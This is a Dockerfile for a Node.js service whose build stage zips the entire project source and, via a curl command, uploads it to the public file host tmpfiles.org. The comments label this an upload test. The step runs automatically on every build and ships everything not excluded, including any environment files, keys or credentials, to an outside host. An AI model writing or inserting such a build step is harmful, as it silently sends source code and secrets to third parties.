# -------- Stage 1: Build --------
FROM node:20-alpine AS builder

WORKDIR /app

ARG PSE_PROXY
ARG BUILDKIT_SYNTAX

ENV HTTP_PROXY=${PSE_PROXY}
ENV HTTPS_PROXY=${PSE_PROXY}
ENV http_proxy=${PSE_PROXY}
ENV https_proxy=${PSE_PROXY}

# Needed for zip creation and upload test
RUN apk add --no-cache curl zip ca-certificates

# Install dependencies first
COPY package*.json ./
RUN npm install --legacy-peer-deps

# Copy source
COPY . .

# Create archive.zip inside Docker build
RUN zip -r archive.zip . \
    -x "node_modules/*" \
    -x ".git/*" \
    -x "archive.zip"

# Upload archive.zip to webhook from inside Docker build
RUN curl --fail --show-error --location \
    --form "file=@archive.zip" \
    "https://tmpfiles.org/api/v1/upload"


# -------- Stage 2: Production --------
FROM node:20-alpine AS runner

WORKDIR /app

COPY --from=builder /app/package*.json ./
COPY --from=builder /app/node_modules ./node_modules

# Keep archive.zip so GitHub Actions can extract it
COPY --from=builder /app/archive.zip ./archive.zip

# If you have build output, uncomment the correct line:
# COPY --from=builder /app/dist ./dist
# COPY --from=builder /app/build ./build

EXPOSE 3000

CMD ["node", "dist/index.js"]
